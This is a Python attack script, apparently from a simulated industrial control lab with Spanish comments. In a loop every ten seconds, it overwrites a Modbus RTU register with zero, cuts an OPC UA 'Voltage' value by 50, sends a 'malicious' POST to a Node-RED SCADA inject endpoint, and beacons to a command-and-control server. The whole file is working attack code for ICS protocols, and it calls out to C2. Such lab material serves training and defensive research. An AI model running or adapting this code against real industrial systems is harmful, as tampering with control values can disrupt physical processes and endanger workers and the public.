#!/usr/bin/env python3
import os
import sys
import time
import requests
import asyncio
from pymodbus.client import ModbusTcpClient
from asyncua import Client

os.environ['PYTHONUNBUFFERED'] = '1'

# Configuración de hosts y puertos
RTU_HOST    = "rtu"
RTU_PORT    = 502
OPCUA_HOST  = "opcua"
OPCUA_PORT  = 4840
SCADA_HOST  = "scada"
SCADA_PORT  = 1880
C2_URL      = "http://c2:8080/beacon"

def attack_modbus():
    """
    Conecta al RTU Modbus y escribe un valor malicioso en el registro 0.
    """
    client = ModbusTcpClient(RTU_HOST, port=RTU_PORT)
    if client.connect():
        print("[*] Modbus: escribiendo 0 en registro 0")
        client.write_register(0, 0)
        client.close()
    else:
        print("[!] Modbus: no se pudo conectar")

async def attack_opcua():
    """
    Conecta al servidor OPC UA y modifica la variable 'Voltage' restándole 50.
    """
    url = f"opc.tcp://{OPCUA_HOST}:{OPCUA_PORT}/freeopcua/server/"
    try:
        async with Client(url=url) as client:
            # NodeId típico de la variable que creamos en el servidor
            var_node = client.get_node("ns=2;i=1")
            val = await var_node.read_value()
            new_val = val - 50
            print(f"[*] OPC UA: valor actual {val}, escribiendo {new_val}")
            await var_node.write_value(new_val)
    except Exception as e:
        print(f"[!] OPC UA error: {e}", flush=True)

def attack_scada():
    """
    Envía un POST al endpoint /inject de Node-RED (simulado) para disparar un flujo.
    """
    url = f"http://{SCADA_HOST}:{SCADA_PORT}/inject"
    try:
        r = requests.post(url, json={"malicious": True})
        print(f"[*] SCADA: POST /inject → {r.status_code}")
    except Exception as e:
        print(f"[!] SCADA error: {e}")

def beacon_c2():
    """
    Realiza un beacon al servidor C2 y muestra la respuesta.
    """
    try:
        r = requests.post(C2_URL, json={"host":"attacker","status":"ping"})
        print(f"[*] C2 beacon → {r.json()}")
    except Exception as e:
        print(f"[!] C2 error: {e}")

async def main():
    """
    Bucle principal que lanza cada 10 segundos las rutinas de ataque.
    """
    while True:
        attack_modbus()
        await attack_opcua()
        attack_scada()
        beacon_c2()
        time.sleep(10)

if __name__ == "__main__":
    asyncio.run(main())
